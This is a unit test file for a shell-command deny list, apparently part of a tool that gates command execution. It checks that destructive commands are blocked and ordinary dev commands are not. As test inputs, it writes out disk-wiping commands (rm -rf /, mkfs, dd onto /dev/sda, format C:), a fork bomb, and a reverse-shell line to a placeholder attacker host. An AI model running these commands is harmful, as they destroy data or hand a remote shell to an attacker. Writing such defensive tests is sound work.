/**
 * Unit tests for Deny List.
 *
 * Validates: Requirements 6.5, 6.6, 32.4
 *
 * Tests that all blocked patterns are matched and that common development
 * commands are NOT blocked (no false positives).
 */
import { describe, it, expect } from 'vitest';
import { isDenied, denyPatterns } from '../deny-list.js';

describe('Deny List', () => {
  // ── Blocked patterns are matched (Req 6.5, 32.4) ──────────────────

  describe('blocked patterns', () => {
    it('should block "rm -rf /"', () => {
      expect(isDenied('rm -rf /')).toBe(true);
    });

    it('should block "rm -rf /home"', () => {
      expect(isDenied('rm -rf /home')).toBe(true);
    });

    it('should block "rm -f -r /" (flags separated)', () => {
      expect(isDenied('rm -f -r /')).toBe(true);
    });

    it('should block "rm -Rf /" (uppercase R)', () => {
      expect(isDenied('rm -Rf /')).toBe(true);
    });

    it('should block "format C:" (Windows format)', () => {
      expect(isDenied('format C:')).toBe(true);
    });

    it('should block "format D:" (case-insensitive)', () => {
      expect(isDenied('FORMAT D:')).toBe(true);
    });

    it('should block "mkfs" commands', () => {
      expect(isDenied('mkfs /dev/sda1')).toBe(true);
    });

    it('should block "mkfs.ext4" variant', () => {
      expect(isDenied('mkfs.ext4 /dev/sda1')).toBe(true);
    });

    it('should block "dd if=" commands', () => {
      expect(isDenied('dd if=/dev/zero of=/dev/sda')).toBe(true);
    });

    it('should block fork bomb ":(){ :|:& };:"', () => {
      expect(isDenied(':(){ :|:& };:')).toBe(true);
    });

    it('should block reverse shell via /dev/tcp', () => {
      expect(isDenied('. /dev/tcp/attacker.com/4444')).toBe(true);
    });
  });

  // ── Common dev commands are NOT blocked (Req 6.6, 32.4) ───────────

  describe('allowed development commands (no false positives)', () => {
    it('should allow "rm ./file.txt"', () => {
      expect(isDenied('rm ./file.txt')).toBe(false);
    });

    it('should allow "rm -f ./temp.log"', () => {
      expect(isDenied('rm -f ./temp.log')).toBe(false);
    });

    it('should allow "rm -r ./dist"', () => {
      expect(isDenied('rm -r ./dist')).toBe(false);
    });

    it('should allow "npm run build"', () => {
      expect(isDenied('npm run build')).toBe(false);
    });

    it('should allow "git status"', () => {
      expect(isDenied('git status')).toBe(false);
    });

    it('should allow "npm test"', () => {
      expect(isDenied('npm test')).toBe(false);
    });

    it('should allow "node index.js"', () => {
      expect(isDenied('node index.js')).toBe(false);
    });

    it('should allow "tsc --noEmit"', () => {
      expect(isDenied('tsc --noEmit')).toBe(false);
    });

    it('should allow "pnpm install"', () => {
      expect(isDenied('pnpm install')).toBe(false);
    });

    it('should allow "cat /etc/hosts"', () => {
      expect(isDenied('cat /etc/hosts')).toBe(false);
    });

    it('should allow "ls -la"', () => {
      expect(isDenied('ls -la')).toBe(false);
    });

    it('should allow "echo hello"', () => {
      expect(isDenied('echo hello')).toBe(false);
    });
  });

  // ── denyPatterns structure ─────────────────────────────────────────

  describe('denyPatterns structure', () => {
    it('should export a non-empty array of patterns', () => {
      expect(denyPatterns.length).toBeGreaterThan(0);
    });

    it('each pattern should have a regex and description', () => {
      for (const entry of denyPatterns) {
        expect(entry.pattern).toBeInstanceOf(RegExp);
        expect(typeof entry.description).toBe('string');
        expect(entry.description.length).toBeGreaterThan(0);
      }
    });
  });
});
